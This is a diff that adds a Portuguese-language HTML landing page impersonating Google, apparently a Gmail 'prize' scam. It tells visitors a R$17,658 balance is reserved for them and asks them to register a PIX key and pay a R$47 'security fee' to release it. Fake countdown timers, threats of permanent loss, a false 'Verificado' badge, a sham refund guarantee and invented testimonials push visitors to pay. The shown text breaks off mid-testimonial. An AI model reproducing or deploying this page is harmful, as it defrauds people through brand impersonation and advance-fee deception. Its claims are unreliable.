@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Gmail Premia Brasil</title>
+<link rel="icon" href="/favicon.svg">
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1514561190722182');fbq('track','PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1514561190722182&ev=PageView&noscript=1"/></noscript>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --blue:   #1a73e8;
+  --blue2:  #4285F4;
+  --red:    #EA4335;
+  --yellow: #FBBC05;
+  --green:  #34A853;
+  --ink0:   #202124;
+  --ink1:   #3c4043;
+  --ink2:   #5f6368;
+  --ink3:   #80868b;
+  --bg:     #f8f9fa;
+  --white:  #ffffff;
+  --f: 'Google Sans','Roboto',Arial,sans-serif;
+  --sh: 0 1px 2px rgba(60,64,67,.3),0 2px 6px 2px rgba(60,64,67,.15);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--f);background:var(--bg);color:var(--ink0);-webkit-font-smoothing:antialiased;overflow-x:hidden}
+
+/* NAV */
+.nav{
+  height:64px;background:var(--white);
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 20px;
+  position:sticky;top:0;z-index:200;
+  box-shadow:0 1px 0 rgba(0,0,0,.08);
+}
+.nav-brand{display:flex;align-items:center;gap:6px}
+.nav-brand svg{width:30px;height:30px;flex-shrink:0}
+.nav-name{font-size:20px;font-weight:400;color:var(--ink2);letter-spacing:-.3px}
+.nav-name b{color:var(--blue)}
+.nav-pill{
+  display:flex;align-items:center;gap:5px;
+  background:#e6f4ea;border-radius:4px;
+  padding:5px 10px;font-size:12px;font-weight:500;color:#188038;
+}
+
+/* HERO */
+.hero{
+  background:var(--white);
+  position:relative;isolation:isolate;overflow:hidden;
+  padding:48px 24px 44px;text-align:center;
+}
+.hero::before{
+  content:"";position:absolute;z-index:-1;
+  width:420px;height:420px;
+  border:56px solid var(--blue2);
+  border-right-color:var(--red);
+  border-bottom-color:var(--yellow);
+  border-left-color:var(--green);
+  border-radius:50%;opacity:.10;
+  top:-280px;left:-160px;
+}
+.hero::after{
+  content:"";position:absolute;z-index:-1;
+  width:340px;height:340px;
+  border:44px solid var(--yellow);
+  border-right-color:var(--green);
+  border-bottom-color:var(--blue2);
+  border-left-color:var(--red);
+  border-radius:50%;opacity:.12;
+  bottom:-260px;right:-140px;
+}
+.hero-eyebrow{
+  display:inline-flex;align-items:center;gap:7px;
+  font-size:12px;font-weight:500;color:var(--ink2);
+  background:var(--bg);border-radius:100px;
+  padding:6px 14px;margin-bottom:22px;
+  box-shadow:0 1px 2px rgba(60,64,67,.2);
+}
+.hero-eyebrow .dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 1.6s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+.hero h1{
+  font-size:28px;font-weight:400;color:var(--ink0);
+  line-height:1.3;letter-spacing:-.5px;max-width:420px;margin:0 auto 14px;
+}
+.hero h1 strong{font-weight:700}
+.hero p{font-size:15px;color:var(--ink2);line-height:1.7;max-width:400px;margin:0 auto 28px}
+.hero p b{color:var(--ink0);font-weight:500}
+.hero-cta{
+  display:inline-flex;align-items:center;gap:8px;
+  background:var(--blue);color:#fff;
+  font-size:15px;font-weight:500;
+  padding:0 28px;height:52px;border-radius:100px;
+  text-decoration:none;
+  box-shadow:0 1px 2px rgba(60,64,67,.3),0 2px 6px 2px rgba(60,64,67,.15);
+  transition:background .15s,box-shadow .15s;
+  font-family:var(--f);border:none;cursor:pointer;
+}
+.hero-cta:hover{background:#1557b0}
+.hero-cta:active{transform:scale(.98)}
+.timer-strip{
+  display:inline-flex;align-items:center;gap:8px;
+  background:#fce8e6;border-radius:100px;
+  padding:7px 16px;margin-top:18px;
+  font-size:13px;font-weight:500;color:var(--red);
+}
+.timer-strip svg{flex-shrink:0}
+#timer{font-weight:700;letter-spacing:1px}
+
+/* TRUST BAR */
+.trust-bar{
+  background:var(--white);border-top:1px solid #e8eaed;
+  display:flex;justify-content:center;gap:0;
+}
+.trust-item{
+  flex:1;max-width:160px;
+  display:flex;flex-direction:column;align-items:center;gap:5px;
+  padding:16px 8px;
+  font-size:11px;font-weight:500;color:var(--ink2);
+  text-align:center;
+}
+.trust-item svg{color:var(--blue)}
+
+/* SECTION */
+.section{padding:36px 24px}
+.section.bg-white{background:var(--white)}
+.section.bg-gray{background:var(--bg)}
+.section-tag{
+  font-size:11px;font-weight:500;letter-spacing:.8px;
+  text-transform:uppercase;color:var(--blue);
+  margin-bottom:6px;
+}
+.section-h{
+  font-size:22px;font-weight:400;color:var(--ink0);
+  line-height:1.35;margin-bottom:8px;
+}
+.section-h strong{font-weight:700}
+.section-sub{font-size:14px;color:var(--ink2);line-height:1.7;margin-bottom:24px}
+
+/* URGENCY ROWS */
+.urg-row{
+  display:flex;align-items:flex-start;gap:14px;
+  padding:14px 20px;border-bottom:1px solid #f1f3f4;
+}
+.urg-num{
+  width:28px;height:28px;border-radius:50%;
+  background:#fce8e6;color:var(--red);
+  font-size:12px;font-weight:500;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;margin-top:1px;
+}
+.urg-row strong{font-size:13px;font-weight:500;color:var(--ink0);display:block;margin-bottom:3px}
+.urg-row span{font-size:12px;color:var(--ink2);line-height:1.6}
+
+/* FEATURE ROWS */
+.feature-row{
+  display:flex;align-items:flex-start;gap:16px;
+  padding:18px 0;border-bottom:1px solid #f1f3f4;
+}
+.feature-row:last-child{border-bottom:none}
+.feat-icon{
+  width:48px;height:48px;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+}
+.feat-icon.blue{background:#e8f0fe}
+.feat-icon.green{background:#e6f4ea}
+.feat-icon.yellow{background:#fef7e0}
+.feat-icon.red{background:#fce8e6}
+.feat-icon svg{width:22px;height:22px}
+.feat-text strong{font-size:14px;font-weight:500;color:var(--ink0);display:block;margin-bottom:3px}
+.feat-text span{font-size:13px;color:var(--ink2);line-height:1.6}
+
+/* STEPS */
+.steps{display:flex;flex-direction:column;gap:0}
+.step-row{
+  display:flex;align-items:flex-start;gap:16px;
+  padding:18px 0;
+  border-bottom:1px solid #f1f3f4;
+  position:relative;
+}
+.step-row:last-child{border-bottom:none}
+.step-num{
+  width:36px;height:36px;border-radius:50%;
+  background:var(--blue);color:#fff;
+  font-size:15px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+  box-shadow:0 1px 4px rgba(26,115,232,.3);
+}
+.step-row strong{font-size:14px;font-weight:500;color:var(--ink0);display:block;margin-bottom:3px}
+.step-row span{font-size:13px;color:var(--ink2);line-height:1.6}
+.step-note{
+  margin-top:20px;
+  background:#fef7e0;border-radius:8px;
+  padding:14px 16px;
+  font-size:13px;color:#594300;line-height:1.6;
+}
+
+/* CTA BLOCK */
+.cta-block{
+  background:linear-gradient(160deg,#1a73e8 0%,#1254aa 100%);
+  padding:36px 24px;text-align:center;
+}
+.cta-block .eyebrow{
+  font-size:11px;font-weight:500;letter-spacing:.8px;
+  text-transform:uppercase;color:rgba(255,255,255,.7);
+  margin-bottom:8px;display:block;
+}
+.cta-block .amount{
+  font-size:44px;font-weight:700;color:#fff;
+  letter-spacing:-1px;line-height:1;margin-bottom:6px;
+}
+.cta-block .sub{
+  font-size:14px;color:rgba(255,255,255,.8);
+  margin-bottom:24px;line-height:1.6;
+}
+.cta-block .btn-white{
+  display:inline-flex;align-items:center;gap:8px;
+  background:#fff;color:var(--blue);
+  font-size:15px;font-weight:500;
+  padding:0 28px;height:52px;border-radius:100px;
+  text-decoration:none;border:none;cursor:pointer;
+  font-family:var(--f);
+  box-shadow:0 1px 3px rgba(0,0,0,.2),0 4px 8px rgba(0,0,0,.15);
+  transition:box-shadow .15s;
+}
+.cta-block .btn-white:hover{box-shadow:0 2px 6px rgba(0,0,0,.3),0 6px 12px rgba(0,0,0,.2)}
+.pix-trust{
+  display:flex;justify-content:center;gap:16px;
+  margin-top:14px;font-size:12px;color:rgba(255,255,255,.7);
+}
+.pix-trust span{display:flex;align-items:center;gap:5px}
+.dot-green{width:7px;height:7px;border-radius:50%;background:var(--green)}
+
+/* GUARANTEE STRIP */
+.guarantee-strip{
+  background:var(--white);
+  border-top:1px solid #e8eaed;
+  padding:18px 24px;
+  display:flex;align-items:flex-start;gap:14px;
+}
+.g-icon-wrap{
+  width:44px;height:44px;background:#e6f4ea;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+}
+.g-icon-wrap svg{color:var(--green)}
+.guarantee-strip strong{font-size:14px;font-weight:500;color:var(--ink0);display:block;margin-bottom:4px}
+.guarantee-strip p{font-size:13px;color:var(--ink2);line-height:1.65}
+.live-chip{
+  display:inline-flex;align-items:center;gap:6px;
+  background:var(--bg);border-radius:100px;
+  padding:5px 12px;font-size:12px;font-weight:500;color:var(--green);
+  margin-top:10px;box-shadow:0 1px 2px rgba(60,64,67,.2);
+}
+
+/* TESTIMONIALS */
+.testimonials{display:flex;flex-direction:column;gap:0}
+.tcard{
+  padding:20px 0;border-bottom:1px solid #f1f3f4;
+}
+.tcard:last-child{border-bottom:none}
+.tcard-head{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+.avatar{
+  width:40px;height:40px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:15px;font-weight:700;flex-shrink:0;
+}
+.t-name{font-size:13px;font-weight:500;color:var(--ink0)}
+.stars{color:var(--yellow);font-size:12px;letter-spacing:1px}
+.t-time{font-size:11px;color:var(--ink3)}
+.tcard p{font-size:14px;color:var(--ink1);line-height:1.7;font-style:italic}
+.tcard p::before{content:'"';font-size:20px;color:var(--blue);font-style:normal;line-height:0;vertical-align:-4px;margin-right:2px}
+
+/* FAQ */
+.faq{display:flex;flex-direction:column;gap:0}
+.faq-item{border-bottom:1px solid #e8eaed}
+.faq-item:last-child{border-bottom:none}
+.faq-btn{
+  width:100%;text-align:left;background:none;border:none;
+  padding:16px 0;
+  font-size:14px;font-weight:500;color:var(--ink0);
+  cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:8px;
+  font-family:var(--f);
+}
+.faq-item.open .faq-btn{color:var(--blue)}
+.faq-btn svg{transition:transform .2s;flex-shrink:0;color:var(--ink3)}
+.faq-item.open .faq-btn svg{transform:rotate(180deg);color:var(--blue)}
+.faq-answer{display:none;padding:0 0 16px;font-size:13px;color:var(--ink2);line-height:1.7}
+.faq-item.open .faq-answer{display:block}
+
+/* FOOTER BAND */
+.footer-band{
+  background:var(--white);border-top:1px solid #e8eaed;
+  padding:32px 24px;text-align:center;
+}
+.footer-band .timer-row2{
+  display:inline-flex;align-items:center;gap:7px;
+  background:#fce8e6;border-radius:100px;
+  padding:6px 16px;font-size:13px;font-weight:500;color:var(--red);
+  margin-bottom:16px;
+}
+.footer-band h2{font-size:20px;font-weight:400;color:var(--ink0);margin-bottom:6px}
+.footer-band h2 strong{font-weight:700}
+.footer-band p{font-size:14px;color:var(--ink2);line-height:1.7;margin-bottom:20px}
+.footer-cta{
+  display:inline-flex;align-items:center;gap:8px;
+  background:var(--blue);color:#fff;
+  font-size:15px;font-weight:500;
+  padding:0 28px;height:52px;border-radius:100px;
+  text-decoration:none;border:none;cursor:pointer;font-family:var(--f);
+  box-shadow:0 1px 2px rgba(60,64,67,.3),0 2px 6px 2px rgba(60,64,67,.15);
+}
+
+/* FOOTER */
+footer{
+  background:var(--bg);border-top:1px solid #e8eaed;
+  text-align:center;padding:16px 20px;
+  font-size:12px;color:var(--ink3);line-height:1.8;
+}
+footer a{color:var(--blue);text-decoration:none}
+
+/* DIVIDER */
+.g-bar{height:3px;display:flex}
+.g-bar span{flex:1}
+
+/* MODAL */
+.modal-overlay{position:fixed;inset:0;z-index:1000;background:rgba(32,33,36,.55);backdrop-filter:blur(3px);display:flex;align-items:flex-end;justify-content:center}
+.modal-overlay[hidden]{display:none}
+.sheet{background:var(--white);border-radius:28px 28px 0 0;padding:0 0 36px;width:100%;max-width:480px;position:relative;box-shadow:0 -4px 40px rgba(32,33,36,.2);animation:up .28s cubic-bezier(.2,0,0,1)}
+@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.sheet-handle{width:32px;height:4px;background:#dadce0;border-radius:2px;margin:12px auto 0}
+.sheet-inner{padding:20px 22px 0}
+.sheet-close{position:absolute;top:14px;right:14px;width:30px;height:30px;background:var(--bg);border:none;border-radius:50%;font-size:14px;color:var(--ink2);cursor:pointer;display:flex;align-items:center;justify-content:center;font-family:var(--f)}
+.sheet-icon{width:52px;height:52px;background:#e8f0fe;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+.sheet h2{font-size:18px;font-weight:500;color:var(--ink0);text-align:center;margin-bottom:5px}
+.sheet-sub{font-size:13px;color:var(--ink2);text-align:center;margin-bottom:20px;line-height:1.6}
+.sheet-sub strong{color:var(--ink0);font-weight:500}
+.g-label{font-size:12px;font-weight:500;color:var(--ink1);display:block;margin-bottom:5px}
+.g-input{width:100%;padding:12px 14px;font-size:14px;font-family:var(--f);border:1.5px solid #dadce0;border-radius:8px;outline:none;color:var(--ink0);background:var(--white);transition:border-color .15s;margin-bottom:8px}
+.g-input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(26,115,232,.1)}
+.g-error{font-size:11px;color:var(--red);margin-top:-5px;margin-bottom:8px;display:none}
+.btn-blue{display:flex;align-items:center;justify-content:center;gap:8px;background:var(--blue);color:#fff;font-size:14px;font-weight:500;padding:0 24px;height:48px;border-radius:100px;text-decoration:none;width:100%;border:none;cursor:pointer;font-family:var(--f);letter-spacing:.01em;box-shadow:0 1px 2px rgba(60,64,67,.3);transition:background .15s}
+.btn-blue:hover{background:#1557b0}
+.trust-row{display:flex;justify-content:center;gap:14px;margin-top:14px;font-size:11px;color:var(--ink3)}
+.trust-row span{display:flex;align-items:center;gap:4px}
+.ok-icon{width:52px;height:52px;background:var(--green);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+
+/* EXIT */
+.exit-sheet{background:var(--white);border-radius:28px 28px 0 0;width:100%;max-width:480px;overflow:hidden;box-shadow:0 -4px 40px rgba(32,33,36,.2);animation:up .28s cubic-bezier(.2,0,0,1)}
+.exit-bar{background:var(--red);color:#fff;font-size:12px;font-weight:500;text-transform:uppercase;letter-spacing:.4px;padding:10px 16px;display:flex;align-items:center;gap:8px}
+.exit-inner{padding:20px;text-align:center}
+.exit-inner h2{font-size:17px;font-weight:500;color:var(--ink0);margin-bottom:8px;line-height:1.35}
+.exit-inner h2 span{color:var(--red)}
+.exit-inner p{font-size:13px;color:var(--ink2);margin-bottom:16px;line-height:1.65}
+.exit-inner p strong{color:var(--ink0);font-weight:500}
+.exit-inner .green{color:var(--green);font-weight:700}
+.exit-rows{display:flex;flex-direction:column;gap:8px;margin-bottom:18px;text-align:left}
+.exit-rows div{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--ink1)}
+.exit-rows svg{color:var(--blue);flex-shrink:0}
+.btn-ghost{background:none;border:none;color:var(--ink3);font-size:12px;cursor:pointer;margin-top:10px;text-decoration:underline;font-family:var(--f);display:block;width:100%;text-align:center;padding:8px}
+.exit-foot{font-size:11px;color:var(--ink3);margin-top:8px;display:flex;align-items:center;justify-content:center;gap:5px}
+
+/* PARCERIA */
+#parceriaPopup{position:fixed;top:72px;right:12px;z-index:9999;max-width:260px;display:none}
+#parceriaCard{background:var(--white);border-radius:8px;box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px 3px rgba(60,64,67,.15);padding:12px 14px;display:flex;align-items:center;gap:10px;animation:fadeSlide .3s ease}
+@keyframes fadeSlide{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeOut{to{opacity:0;transform:translateY(-6px)}}
+#parceriaCard img{width:26px;height:26px;border-radius:4px}
+#parceriaCard strong{font-size:12px;font-weight:500;color:var(--ink0);display:block}
+#parceriaCard span{font-size:11px;color:var(--ink2)}
+/* SPLASH */
+#splash{
+  position:fixed;inset:0;z-index:9999;
+  background:#fff;
+  display:flex;align-items:center;justify-content:center;
+  transition:opacity .5s ease;
+  overflow:hidden;
+}
+#splash.hide{opacity:0;pointer-events:none}
+.sp-stage{position:relative;width:300px;height:110px;display:flex;align-items:center;justify-content:center}
+.sp-logo{
+  position:absolute;
+  width:76px;height:76px;object-fit:contain;border-radius:16px;
+  opacity:0;
+}
+.sp-wrap{
+  position:absolute;
+  display:flex;flex-direction:column;align-items:center;gap:7px;
+  opacity:0;
+}
+.sp-wrap span{
+  font-size:11px;font-weight:500;color:#5f6368;letter-spacing:.2px;
+}
+#spWrapGmail{
+  animation:
+    spPop .4s cubic-bezier(.34,1.56,.64,1) .1s forwards,
+    spLeft .4s cubic-bezier(.4,0,.2,1) .9s forwards;
+}
+#spWrapInsta{
+  animation: spRight .45s cubic-bezier(.34,1.56,.64,1) 1.1s forwards;
+}
+#spGmail{position:relative;opacity:1;animation:none}
+#spInsta{position:relative;opacity:1;animation:none}
+#spX{
+  position:absolute;left:50%;top:50%;transform:translate(-50%,-50%) scale(0);
+  font-size:56px;font-weight:700;color:#202124;
+  animation:spXpop .35s cubic-bezier(.34,1.56,.64,1) 1.35s forwards;
+  line-height:1;
+  opacity:0;
+}
+@keyframes spPop{
+  from{opacity:0;transform:translateX(0) scale(.5)}
+  to{opacity:1;transform:translateX(0) scale(1)}
+}
+@keyframes spLeft{
+  from{transform:translateX(0)}
+  to{transform:translateX(-80px)}
+}
+@keyframes spRight{
+  from{opacity:0;transform:translateX(80px) scale(.5)}
+  to{opacity:1;transform:translateX(80px) scale(1)}
+}
+@keyframes spXpop{
+  from{opacity:0;transform:translate(-50%,-50%) scale(0) rotate(-20deg)}
+  to{opacity:1;transform:translate(-50%,-50%) scale(1) rotate(0deg)}
+}
+</style>
+</head>
+<body>
+
+<!-- SPLASH -->
+<div id="splash">
+  <div class="sp-stage">
+    <div id="spWrapGmail" class="sp-wrap">
+      <img id="spGmail" class="sp-logo" src="/logozuda.webp" alt="Gmail">
+      <span>Gmail</span>
+    </div>
+    <span id="spX">×</span>
+    <div id="spWrapInsta" class="sp-wrap">
+      <img id="spInsta" class="sp-logo" src="/instagram.png" alt="Instagram">
+      <span>Instagram</span>
+    </div>
+  </div>
+</div>
+<script>
+(function(){
+  var s=document.getElementById('splash');
+  setTimeout(function(){
+    s.classList.add('hide');
+    setTimeout(function(){s.style.display='none'},500);
+  },2400);
+})();
+</script>
+
+
+<!-- NAV -->
+<nav class="nav">
+  <div class="nav-brand">
+    <svg viewBox="0 0 46 46" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M23.5 10.5C26.7 10.5 29.6 11.7 31.8 13.7L37.6 7.9C34.0 4.6 29.0 2.5 23.5 2.5C14.9 2.5 7.5 7.5 4.0 14.7L10.9 20.1C12.6 15.0 17.6 10.5 23.5 10.5Z" fill="#EA4335"/>
+      <path d="M43.6 23.5C43.6 22.0 43.5 20.5 43.2 19.0H23.5V27.5H34.8C34.3 30.1 32.8 32.3 30.6 33.8L37.3 38.9C40.9 35.7 43.6 30.1 43.6 23.5Z" fill="#4285F4"/>
+      <path d="M10.9 27.9C10.4 26.5 10.1 25.0 10.1 23.5C10.1 22.0 10.4 20.5 10.9 19.1L4.0 13.7C2.4 16.7 1.5 20.0 1.5 23.5C1.5 27.0 2.4 30.3 4.0 33.3L10.9 27.9Z" fill="#FBBC05"/>
+      <path d="M23.5 36.5C17.6 36.5 12.6 32.0 10.9 26.9L4.0 32.3C7.5 39.5 14.9 44.5 23.5 44.5C29.0 44.5 34.0 42.4 37.6 39.1L30.6 34.0C29.0 35.2 26.4 36.5 23.5 36.5Z" fill="#34A853"/>
+    </svg>
+    <span class="nav-name">Gmail <b>Premia</b></span>
+  </div>
+  <div class="nav-pill">
+    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+    Verificado
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-eyebrow">
+    <span class="dot"></span>
+    Contemplados desta semana
+  </div>
+  <h1>Seu saque de <strong>R$ 17.658</strong><br>precisa ser liberado hoje</h1>
+  <p>O saldo de <b>R$ 17.658,00</b> está reservado no sistema aguardando apenas a sua validação final para ser transferido.</p>
+  <button onclick="openModal()" class="hero-cta">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+    Liberar meu dinheiro agora
+  </button>
+  <div><div class="timer-strip">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+    Oferta expira em <span id="timer">12:00</span>
+  </div></div>
+</section>
+
+<!-- TRUST BAR -->
+<div class="trust-bar">
+  <div class="trust-item">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    100% Seguro
+  </div>
+  <div class="trust-item">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+    Acesso imediato
+  </div>
+  <div class="trust-item">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+    Criptografado
+  </div>
+</div>
+
+<!-- URGENCY -->
+<section class="section bg-white" style="padding:0">
+  <div style="padding:14px 20px 6px">
+    <p style="font-size:13px;color:var(--ink2);margin-bottom:4px">Se você não validar <strong style="color:var(--ink0)">até hoje</strong>, o sistema vai:</p>
+  </div>
+  <div>
+    <div class="urg-row">
+      <div class="urg-num">1</div>
+      <div><strong>Saque bloqueado permanentemente</strong><span>O valor de R$ 17.658,00 retorna ao fundo sem possibilidade de resgate.</span></div>
+    </div>
+    <div class="urg-row">
+      <div class="urg-num">2</div>
+      <div><strong>Prioridade encerrada</strong><span>Sua posição preferencial na campanha é cancelada imediatamente.</span></div>
+    </div>
+    <div class="urg-row">
+      <div class="urg-num">3</div>
+      <div><strong>Acesso ao grupo VIP removido</strong><span>Benefícios extras e grupo exclusivo ficam indisponíveis para sua conta.</span></div>
+    </div>
+    <div class="urg-row" style="border-bottom:none">
+      <div class="urg-num">4</div>
+      <div><strong>Liberação futura impedida</strong><span>Nenhuma solicitação posterior será aceita para este saldo.</span></div>
+    </div>
+  </div>
+</section>
+
+<div class="g-bar"><span style="background:#4285F4"></span><span style="background:#EA4335"></span><span style="background:#FBBC05"></span><span style="background:#34A853"></span></div>
+
+<!-- BENEFITS -->
+<section class="section bg-gray">
+  <p class="section-tag">Ao confirmar agora</p>
+  <h2 class="section-h">Você garante <strong>todos estes benefícios</strong></h2>
+  <div>
+    <div class="feature-row">
+      <div class="feat-icon blue"><svg viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg></div>
+      <div class="feat-text"><strong>Saque Integral — R$ 17.658,00</strong><span>Transferido direto para sua chave PIX em poucos minutos.</span></div>
+    </div>
+    <div class="feature-row">
+      <div class="feat-icon green"><svg viewBox="0 0 24 24" fill="none" stroke="#34A853" stroke-width="2.5"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
+      <div class="feat-text"><strong>Participação VIP nos próximos sorteios</strong><span>Sua conta segue ativa nos sorteios semanais com benefícios extras.</span></div>
+    </div>
+    <div class="feature-row">
+      <div class="feat-icon yellow"><svg viewBox="0 0 24 24" fill="none" stroke="#FBBC05" stroke-width="2.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></div>
+      <div class="feat-text"><strong>Grupo VIP dos Contemplados</strong><span>Acesso ao grupo exclusivo dos sorteados desta temporada.</span></div>
+    </div>
+    <div class="feature-row">
+      <div class="feat-icon red"><svg viewBox="0 0 24 24" fill="none" stroke="#EA4335" stroke-width="2.5"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.23h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg></div>
+      <div class="feat-text"><strong>Suporte oficial direto</strong><span>Atendimento prioritário da equipe oficial durante o processo.</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- STEPS -->
+<section class="section bg-white">
+  <p class="section-tag">Como funciona</p>
+  <h2 class="section-h"><strong>4 passos</strong> para liberar o seu saque</h2>
+  <div class="steps">
+    <div class="step-row">
+      <div class="step-num">1</div>
+      <div><strong>Clique no botão abaixo</strong><span>Inicie o processo clicando em "Liberar meu dinheiro agora".</span></div>
+    </div>
+    <div class="step-row">
+      <div class="step-num">2</div>
+      <div><strong>Cadastre sua Chave PIX</strong><span>Informe exatamente a chave para onde o sistema deve transferir.</span></div>
+    </div>
+    <div class="step-row">
+      <div class="step-num">3</div>
+      <div><strong>Pague a taxa de segurança</strong><span>Preencha seus dados no checkout e pague a taxa única antifraude de R$ 47,00.</span></div>
+    </div>
+    <div class="step-row">
+      <div class="step-num">4</div>
+      <div><strong>Saldo cai automaticamente</strong><span>Após a confirmação da taxa, os R$ 17.658 são depositados no seu banco.</span></div>
+    </div>
+  </div>
+  <div class="step-note">
+    <strong>Atenção:</strong> Apenas gerar a chave PIX sem efetuar o pagamento não garante o direito ao saldo. A liberação ocorre estritamente após a baixa do pagamento.
+  </div>
+</section>
+
+<!-- CTA BLOCK -->
+<div class="cta-block">
+  <span class="eyebrow">Extrato da liberação</span>
+  <div class="amount">R$ 17.658,00</div>
+  <p class="sub">Saldo reservado no seu nome — válido até hoje</p>
+  <button onclick="openModal()" class="btn-white">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+    Liberar dinheiro agora
+  </button>
+  <div class="pix-trust">
+    <span><span class="dot-green"></span>PIX instantâneo</span>
+    <span><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Gateway seguro</span>
+    <span><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL 256-bit</span>
+  </div>
+</div>
+
+<!-- GUARANTEE -->
+<div class="guarantee-strip">
+  <div class="g-icon-wrap">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+  </div>
+  <div>
+    <strong>Garantia de devolução rápida</strong>
+    <p>Se o PIX de R$ 17.658 não for liberado em até 3 minutos, devolvemos <strong>100% do valor pago</strong> imediatamente — sem precisar pedir.</p>
+    <div class="live-chip"><span class="dot-green"></span>+3.200 contemplados essa semana</div>
+  </div>
+</div>
+
+<div class="g-bar"><span style="background:#4285F4"></span><span style="background:#EA4335"></span><span style="background:#FBBC05"></span><span style="background:#34A853"></span></div>
+
+<!-- TESTIMONIALS -->
+<section class="section bg-gray">
+  <p class="section-tag">Depoimentos</p>
+  <h2 class="section-h">Histórias reais de quem foi <strong>sorteado</strong></h2>
+  <div class="testimonials">
+    <div class="tcard">
+      <div class="tcard-head">
+        <div class="avatar" style="background:#e8f0fe;color:#1a73e8">AB</div>
+        <div><div class="t-name">Ana Beatriz</div><div style="display:flex;gap:6px;margin-top:2px"><span class="stars">★★★★★</span><span class="t-time">· há 2 h</span></div></div>
+      </div>
+      <p>Achei que era brincadeira, mas resolvi confirmar. Em poucos minutos a notificação do banco apareceu com os R$ 17.658,00! 🙏</p>
+    </div>
+    <div class="tcard">
+      <div class="tcard-head">
+        <div class="avatar" style="background:#e6f4ea;color:#34A853">RT</div>
